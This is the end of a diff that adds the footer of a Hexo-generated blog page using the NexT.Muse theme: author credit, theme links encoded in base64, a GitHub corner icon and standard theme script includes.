+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
